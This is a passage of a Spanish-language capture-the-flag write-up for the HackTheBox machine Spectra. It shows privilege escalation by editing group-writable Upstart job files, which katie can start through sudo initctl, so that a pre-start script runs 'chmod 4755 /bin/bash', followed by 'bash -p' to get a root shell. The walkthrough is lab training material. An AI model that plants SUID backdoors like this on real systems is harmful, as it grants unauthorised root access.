+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Estamos en un grupo llamado <code>developers</code>, tenemos archivos relacionados con <code>root</code> y <code>katie</code>:</p>
+
+<pre><code class="language-bash">katie@spectra ~ $ id
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
+katie@spectra ~ $ find / -group developers -ls 2&gt;/dev/null
+    32121      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test6.conf
+    32123      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test7.conf
+    32109      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test3.conf
+    32112      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test4.conf
+    32103      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test.conf
+    32126      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test8.conf
+    32128      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test9.conf
+    32106      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test10.conf
+    32108      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test2.conf
+    32120      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test5.conf
+    32105      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test1.conf
+    23762      4 drwxr-xr-x   2 root     developers     4096 Jun 29  2020 /srv
+    23763      4 -rwxrwxr-x   1 root     developers      251 Jun 29  2020 /srv/nodetest.js
+</code></pre>
+
+<p>También nos damos cuenta enumerando los permisos de <strong>katie</strong> como administrador del sistema (<code>sudo -l</code>) que puede ejecutar un binario:</p>
+
+<pre><code class="language-bash">katie@spectra ~ $ sudo -l
+User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl
+katie@spectra ~ $
+</code></pre>
+
+<blockquote>
+  <p><strong>initctl</strong> allows a system administrator to communicate and interact with the <code>Upstart</code> init daemon.</p>
+  <blockquote>
+    <p><a href="http://manpages.ubuntu.com/manpages/xenial/man8/initctl.8.html">manpages.ubuntu - initctl</a>.</p>
+  </blockquote>
+</blockquote>
+
+<blockquote>
+  <p>Upstart es un reemplazo basado en eventos para el daemon init, el método utilizado por varios sistemas operativos Unix-like para realizar tareas durante el arranque del sistema.</p>
+  <blockquote>
+    <p><a href="https://es.wikipedia.org/wiki/Upstart">Wikipedia - Upstart</a>.</p>
+  </blockquote>
+</blockquote>
+
+<ul>
+  <li><a href="https://ikasten.io/2011/10/12/upstart-una-introduccion-para-los-viejos-rockeros-de-init/">Más info de <strong>Upstart</strong> y su gestión de tareas en el arranque</a>.</li>
+  <li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">Un post que me encanto por como se estructuró el uso de los archivos <strong>.conf</strong></a>.</li>
+</ul>
+
+<p>Vale, si vemos algunos de los archivos <code>.conf</code> (<a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">archivos de configuración de tareas</a>) y los comparamos entre sí, vemos que todos tienen el mismo contenido, asi que elijamos por ejemplo el archivo <code>/etc/init/test9.conf</code> para trabajar:</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ cat test9.conf 
+description "Test node.js server"
+author      "katie"
+
+start on filesystem or runlevel [2345]
+stop on shutdown
+
+script
+
+    export HOME="/srv"
+    echo $$ &gt; /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+    echo "[`date`] Node Test Starting" &gt;&gt; /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo "[`date`] Node Test Stopping" &gt;&gt; /var/log/nodetest.log
+end script
+</code></pre>
+
+<p>Entonces tenemos:</p>
+
+<ul>
+  <li>Simplemente cada vez que se inicia la tarea, esta ejecuta el script <code>/srv/nodetest.js</code> mediante el binario <code>node</code>.</li>
+  <li>Y guarda un log una vez es iniciado (con su hora y fecha) y una vez es finalizado (también con hora y fecha).</li>
+</ul>
+
+<p>Si miramos el script (<code>/srv/nodetest.js</code>) que ejecuta entendemos que significa el puerto <code>8081</code> que vimos en nuestro escaneo inicial:</p>
+
+<pre><code class="language-js">var http = require("http");
+
+http.createServer(function (request, response) {
+   response.writeHead(200, {'Content-Type': 'text/plain'});
+   
+   response.end('Hello World\n');
+}).listen(8081);
+
+console.log('Server running at http://127.0.0.1:8081/');
+</code></pre>
+
+<p>Ya que esta levantando un servidor web en ese puerto… Lo que quiere decir que cada vez que algún <code>testX.conf</code> esta activo, tendríamos el puerto <code>8081</code> abierto.</p>
+
+<p>Para ver que <strong>jobs</strong> están activos de los que nos interesan (<code>testX.conf</code>) podemos ejecutar:</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ sudo /sbin/initctl list | grep test
+test stop/waiting
+test1 stop/waiting
+test7 stop/waiting
+test6 stop/waiting
+test5 stop/waiting
+test4 stop/waiting
+test10 stop/waiting
+test9 stop/waiting
+test8 stop/waiting
+test3 stop/waiting
+test2 stop/waiting
+</code></pre>
+
+<p>Para iniciar o detener simplemente indicamos <code>start</code> o <code>stop</code> respectivamente y el nombre del job.</p>
+
+<p>Entonces sabemos que podemos ejecutar este comando como usuario administrador del sistema, además sabemos que podemos modificar los archivos, ya que su grupo es el grupo <code>developers</code>, en el cual estamos nosotros. Asi que podemos probar a guardar el input del <code>id</code> en el mismo archivo <code>.log</code> y asi corroborar que somos root y que tenemos ejecucion de comandos, démosle a ver:</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ cat test9.conf 
+...
+pre-start script
+    echo "[`date`] Node Test Starting" &gt;&gt; /var/log/nodetest.log
+    id &gt;&gt; /var/log/nodetest.log
+end script
+...
+</code></pre>
+
+<p>Entonces, cuando hagamos <code>start</code> guardara la cadena de texto, pero además (si todo va bien) guardara el id del usuario que ejecuta la tarea (en este caso <code>root</code> al hacer uso de <code>sudo</code>):</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ sudo /sbin/initctl start test9
+test9 start/running, process 4684
+</code></pre>
+
+<p>Yyyyy:</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ cat /var/log/nodetest.log
+[Tue Mar  9 16:41:30 PST 2021] Node Test Starting
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Perfecto, peeeeeeeeeeeeeerfecto, con esto ya podríamos directamente ver la flag, pero intentemos obtener una Shell (aun teniendo en cuenta los problemitas que puso <code>bash</code> al inicio).</p>
+
+<p>Para esto podemos otorgarle el permiso <code>SUID</code> a la bash que tenemos, asi despues simplemente indicaríamos <code>bash -p</code> (para que atienda al privilegio del <code>SUID</code>) y cambiaríamos la Shell inicial (<code>katie</code>) a la que esta ejecutando <code>root</code>:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=KH9EGcDMMRI&amp;t=1527s">Asignando <strong>SUID</strong> a la bash para convertirnos en <strong>root</strong> - S4vitar lo explica también :P</a>.</li>
+</ul>
+
+<blockquote>
+  <p>Los binarios <strong>SUID</strong> permiten a los usuarios ejecutar un archivo ejecutable con los permisos del archivo ejecutable o el propietario del grupo.</p>
+  <blockquote>
+    <p><a href="https://www.enmimaquinafunciona.com/pregunta/11304/como-puedo-borrar-el-permiso-de-s-en-un-directorio-en-linux">Permiso <strong>s</strong> en un objeto linux</a>.</p>
+  </blockquote>
+</blockquote>
+
+<p>Entonces, primero validemos como esta el binario <code>/bin/bash</code> antes de asignarle el permiso <code>SUID</code>:</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ ls -la /bin/bash
+-rwxr-xr-x 1 root root 551984 Dec 22 05:46 /bin/bash
+# Tiene el permiso 755, pero faltaria el 4 (que es el SUID)
+</code></pre>
+
+<p>En estos momentos no podemos hacer nada con esa bash, ya que se ejecutaría una sesión dependiendo el usuario que lo ejecute, no el propietario…</p>
+
+<p>Vamos al archivo job y agregamos:</p>
+
+<pre><code class="language-bash">...
+pre-start script
+    echo "[`date`] Node Test Starting" &gt;&gt; /var/log/nodetest.log
+    chmod 4755 /bin/bash
+end script
+...
+</code></pre>
+
+<p>Y ejecutamos:</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ sudo /sbin/initctl start test9
+</code></pre>
+
+<p>Y si validamos ahora el binario <code>/bin/bash</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_change_binBASH_SUID.png" alt="317bash_change_binBASH_SUID" /></p>
+
+<p>Perfecto, para validar lo que hicimos simplemente ejecutaríamos el binario, pero con el parámetro <code>-p</code> para que tome el SUID:</p>
+
+<pre><code class="language-bash">katie@spectra /etc/init $ /bin/bash
+bash-4.3$ whoami
+katie
+bash-4.3$ exit
+katie@spectra /etc/init $ /bin/bash -p
+bash-4.3# whoami
+root
+</code></pre>
+
+<p>Listones, solo nos quedaría ver las flags :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317flags.png" alt="317flags" /></p>
+
+<p>…</p>
+
+<p>Wenoo, la parte de la contraseña de <code>katie</code> me pareció realmente rara y medio fea (aunque parece algo “real” del entorno <code>chronium-os</code>), pero por lo demás me gusto, fue la primera vez que jugué con la asignación del permiso <code>SUID</code> al binario <code>/bin/bash</code> y que lo documento, asi que una nueva cosita que queda plasmada (:</p>
+
+<p>Muchas gracias por leer y como siempre, a romper todo, bless y feliz vida.</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Spectra&url=http://localhost:4000/htb/spectra" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SUID">SUID</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#initctl">initctl</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#wordpress">wordpress</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/knife">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/knife">HackTheBox - Knife</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
